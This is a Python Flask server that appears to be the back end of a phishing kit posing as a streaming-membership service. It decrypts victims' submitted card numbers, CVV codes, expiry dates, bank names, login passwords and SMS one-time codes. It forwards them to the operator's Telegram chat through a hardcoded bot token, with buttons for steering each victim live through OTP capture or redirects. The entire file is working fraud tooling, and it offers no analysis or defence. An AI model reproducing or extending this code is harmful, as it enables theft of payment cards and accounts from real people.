from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests
import json
import logging
import os
from dotenv import load_dotenv

load_dotenv()

from collections import defaultdict

# Store completed sessions
completed_sessions = set()
pending_sessions = defaultdict(dict)

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Get environment variables
ENCRYPTION_KEY = bytes.fromhex(os.getenv('ENCRYPTION_KEY', '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'))
IV = bytes.fromhex(os.getenv('IV', '0123456789abcdef0123456789abcdef'))
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '1096335592')
NODE_SERVER_URL = os.getenv('NODE_SERVER_URL', 'https://d60e5406-587e-45fe-8826-c38f5e292056-0-membership.fly.dev')

def decrypt_data(encrypted_data):
    try:
        cipher = Cipher(
            algorithms.AES(ENCRYPTION_KEY),
            modes.CBC(IV),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(bytes.fromhex(encrypted_data)) + decryptor.finalize()

        # Remove padding more carefully
        unpadded_data = padded_data.decode('utf-8').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f')

        logger.debug(f"Decrypted data before JSON parse: {unpadded_data}")
        return json.loads(unpadded_data)
    except Exception as e:
        logger.error(f"Decryption error: {str(e)}")
        raise

def send_node_request(session_id, response_data, allow_redirects=True):
    """Send request to Node.js server with proper handling of redirects"""
    try:
        response = requests.post(
            f'{NODE_SERVER_URL}/session-update',
            json={'sessionId': session_id, 'response': response_data},
            headers={'Content-Type': 'application/json'},
            allow_redirects=allow_redirects,
            timeout=30
        )

        # Handle redirect
        if response.status_code == 302:
            logger.info(f"Following redirect for session {session_id}")
            # Get redirect location
            redirect_url = response.headers.get('Location')
            if redirect_url:
                # Follow redirect manually
                response = requests.post(
                    redirect_url,
                    json={'sessionId': session_id, 'response': response_data},
                    headers={'Content-Type': 'application/json'},
                    timeout=30
                )

        return response.status_code in [200, 201, 302]

    except requests.exceptions.RequestException as e:
        logger.error(f"Request to Node.js failed: {str(e)}")
        return False

def send_telegram_message(chat_id, text, keyboard=None):
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }

        if keyboard:
            payload['reply_markup'] = json.dumps(keyboard)

        logger.debug(f"Sending Telegram message: {payload}")
        response = requests.post(url, json=payload, timeout=10)
        logger.debug(f"Telegram response: {response.text}")
        return response.json()
    except Exception as e:
        logger.error(f"Telegram error: {str(e)}")
        raise

@app.route('/')
def home():
    return "Server is running"

@app.route('/receive-encrypted-data', methods=['POST'])
def receive_encrypted_data():
    try:
        logger.debug("Received encrypted data request")
        data = request.get_json()
        logger.debug(f"Request data: {data}")

        encrypted_data = data.get('encryptedData')
        message_type = data.get('messageType')

        if not encrypted_data:
            logger.error("Missing encrypted data")
            return jsonify({
                'success': False,
                'message': 'Missing encrypted data'
            }), 400

        decrypted_data = decrypt_data(encrypted_data)

        # Format message based on message type
        if message_type == 'payment':
            if decrypted_data['cardType'] == 'American Express':
                message = f"""
- NFX DATA -
CCNUM: {decrypted_data['creditCardNumber']}
CARD TYPE: {decrypted_data['cardType'].upper()}
EXP DATE: {decrypted_data['creditExpirationMonth']}
CID: {decrypted_data['creditCardSecurityCode']}
SPC: {decrypted_data['creditCardSecurityPCode']}
FULL NAME: {decrypted_data['firstName'].upper()}
ZIPCODE: {decrypted_data['creditZipcode']}
BANK: {decrypted_data['bankName'].upper()}
IP: {decrypted_data['ip']}
Session ID: {decrypted_data['sessionId']}"""
                inline_keyboard = {
                    'inline_keyboard': [
                        [{'text': '✅ Approve with Custom URL', 'callback_data': f"redirect_{decrypted_data['sessionId']}"}],
                        [{'text': '▶️ Continue to OTP', 'callback_data': f"approve_{decrypted_data['sessionId']}"}],
                        [{'text': '❌ Decline Payment', 'callback_data': f"decline_{decrypted_data['sessionId']}"}],
                        [{'text': '🔁 Redirect to PPL', 'callback_data': f"redirect_ppl_{decrypted_data['sessionId']}"}]
                    ]
                }
            else:
                message = f"""
- NFX DATA -
CCNUM: {decrypted_data['creditCardNumber']}
CARD TYPE: {decrypted_data['cardType'].upper()}
EXP DATE: {decrypted_data['creditExpirationMonth']}
CVV: {decrypted_data['creditCardSecurityCode']}
FULL NAME: {decrypted_data['firstName'].upper()}
ZIPCODE: {decrypted_data['creditZipcode']}
BANK: {decrypted_data['bankName'].upper()}
IP: {decrypted_data['ip']}
Session ID: {decrypted_data['sessionId']}"""
                inline_keyboard = {
                    'inline_keyboard': [
                        [{'text': '✅ Approve with Custom URL', 'callback_data': f"redirect_{decrypted_data['sessionId']}"}],
                        [{'text': '▶️ Continue to OTP', 'callback_data': f"approve_{decrypted_data['sessionId']}"}],
                        [{'text': '❌ Decline Payment', 'callback_data': f"decline_{decrypted_data['sessionId']}"}],
                        [{'text': '🔁 Redirect to PPL', 'callback_data': f"redirect_ppl_{decrypted_data['sessionId']}"}]
                    ]
                }
        elif message_type == 'login':
            message = f"""- NFX LOGIN -
USER: {decrypted_data['userLoginId']}
PASS: {decrypted_data['password']}
IP: {decrypted_data['ip']}
- NFX LOGIN -"""
            inline_keyboard = None
        elif message_type == 'otp':
            message = f"""-------------------- <3 NFX{' 2' if decrypted_data['type'] == 'NFX2' else ''} <3-------------------
SMS Code  : {decrypted_data['smsCode']}
SPC = {decrypted_data['spc']}
IP      : {decrypted_data['ip']}
-------------------- <3 NFX{' 2' if decrypted_data['type'] == 'NFX2' else ''} <3-------------------"""
            inline_keyboard = None

        # Send to Telegram
        telegram_response = send_telegram_message(TELEGRAM_CHAT_ID, message, inline_keyboard)

        if telegram_response.get('ok'):
            return jsonify({'success': True})
        return jsonify({
            'success': False,
            'message': 'Failed to send Telegram message'
        }), 500

    except Exception as e:
        logger.error(f"Error in receive_encrypted_data: {str(e)}")
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/telegram-updates', methods=['POST'])
def telegram_updates():
    try:
        data = request.get_json()
        logger.debug(f"Received telegram update: {data}")

        if 'callback_query' in data:
            callback_query = data['callback_query']
            callback_data = callback_query['data']
            chat_id = callback_query['message']['chat']['id']
            message = callback_query['message']['text']

            # Parse the callback data
            parts = callback_data.split('_')
            action = parts[0]
            session_id = parts[-1]

            # Extract user info
            try:
                bank_name = message.split('BANK: ')[1].split('\n')[0]
                full_name = message.split('FULL NAME: ')[1].split('\n')[0]
            except:
                bank_name = "Unknown Bank"
                full_name = "Unknown User"

            # Check completed sessions
            if session_id in completed_sessions:
                send_telegram_message(chat_id, '❌ This session has already been processed')
                return jsonify({'success': False, 'message': 'Session already processed'})

            # Prepare response based on action
            response_data = None
            confirmation_message = None

            if action == 'approve':
                response_data = {
                    'status': 'approve',
                    'message': 'continue_to_otp',
                    'method': 'POST',
                    'redirectUrl': '/otp-verification',
                    'formData': {'bank': bank_name, 'cchold': full_name}
                }
                confirmation_message = f"✅ Continued to OTP verification for {full_name}"

            elif action == 'decline':
                response_data = {
                    'status': 'declined',
                    'message': 'payment_declined'
                }
                confirmation_message = f"❌ Payment declined for {full_name}"

            elif action == 'redirect' and 'ppl' in callback_data:
                response_data = {
                    'status': 'declined',
                    'message': 'redirecting_to_ppl',
                    'showPaymentFormContainer1': True
                }
                confirmation_message = f"🔄 Redirected {full_name} to PPL"

            elif action == 'redirect':
                response_data = {'status': 'waiting_for_url'}
                confirmation_message = f"⏳ Waiting for custom URL for {full_name}"

            if response_data:
                # Send to Node.js
                if send_node_request(session_id, response_data):
                    # Update session state
                    if action != 'redirect':
                        completed_sessions.add(session_id)
                    else:
                        pending_sessions[session_id]['status'] = 'waiting_for_url'

                    # Send confirmation
                    if confirmation_message:
                        send_telegram_message(chat_id, confirmation_message)

                    return jsonify({'success': True})
                else:
                    raise Exception("Failed to update session")

        elif data.get('message') and data['message'].get('text', '').startswith('http'):
            message_text = data['message']['text']
            chat_id = data['message']['chat']['id']

            # Find pending session
            active_session = None
            for session_id, session_data in pending_sessions.items():
                if session_data.get('status') == 'waiting_for_url':
                    active_session = session_id
                    break

            if active_session:
                if send_node_request(active_session, {
                    'status': 'url_redirect',
                    'url': message_text
                }):
                    completed_sessions.add(active_session)
                    del pending_sessions[active_session]
                    send_telegram_message(chat_id, "✅ URL successfully set")
                else:
                    send_telegram_message(chat_id, "❌ Failed to set URL")
            else:
                send_telegram_message(chat_id, "❌ No active session waiting for URL")

        return jsonify({'success': True})

    except Exception as e:
        logger.error(f"Error in telegram_updates: {str(e)}")
        return jsonify({'success': False, 'message': str(e)}), 500

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)